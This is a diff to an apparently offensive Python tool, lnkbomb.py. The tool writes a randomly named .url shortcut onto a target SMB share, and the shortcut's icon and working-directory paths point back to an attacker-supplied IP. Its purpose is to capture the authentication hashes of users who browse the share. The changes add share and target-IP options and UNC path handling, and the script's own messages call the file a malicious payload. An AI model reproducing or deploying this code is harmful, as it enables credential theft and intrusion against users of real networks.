@@ -4,6 +4,7 @@ import argparse
 import textwrap
 import string
 import random
+from smb.SMBConnection import SMBConnection
 
 
 def banner():
@@ -23,11 +24,13 @@ def options():
         Example: python3 lnkbomb.py --recover filename
 '''))
     opt_parser.add_argument(
-        '-t', '--target', help='Sets the target file share.')
+        '-t', '--target', help='Sets the target ip.')
+    opt_parser.add_argument('-s', '--share', help="Share to access.")
     opt_parser.add_argument(
         '-a', '--attacker', help='Sets the attack machine IP.')
     opt_parser.add_argument(
         '-r', '--recover', help='Removes the malicious payload from the share.')
+
     global args
     args = opt_parser.parse_args()
     if len(sys.argv) == 1:
@@ -42,18 +45,20 @@ def main():
                                 for i in range(10))
             directory = ''.join(random.choice(string.ascii_lowercase)
                                 for i in range(10))
-            with open(f'{args.target}\{file_name}.url', 'w', newline='\r\n') as payload_file:
+            tar_dir = (rf'\\{args.target}\{args.share}\{file_name}.url')
+            with open(tar_dir, 'w', newline='\r\n') as payload_file:
                 payload_file.write(
                     f"[InternetShortcut]\nURL={args.attacker}\nWorkingDirectory=\\\\{args.attacker}\{directory}\nIconFile=\\\\{args.attacker}\{directory}.icon\nIconIndex=1")
                 print(
-                    f'Malicious shortcut named {file_name}.url created in the {args.target} file share.\r\n')
+                    f'Malicious shortcut named {file_name}.url created in the \\\\{args.target}\\{args.share} file share.\r\n')
             with open(f'{file_name}.recovery', 'a+') as recovery_file:
-                recovery_file.write(f'{args.target}\{file_name}')
+                recovery_file.write(f'\\{args.target}\{args.share}\{file_name}')
                 print(
                     f'Recovery file {file_name}.recovery created in your current directory.\n')
                 print(
                     f'Run python3 lnkbomb.py -r {file_name}.recovery to remove the file from the target share.')
-    except FileNotFoundError:
+
+    except KeyboardInterrupt:
         print("File share cannot be found. Try again.")
         quit()
 
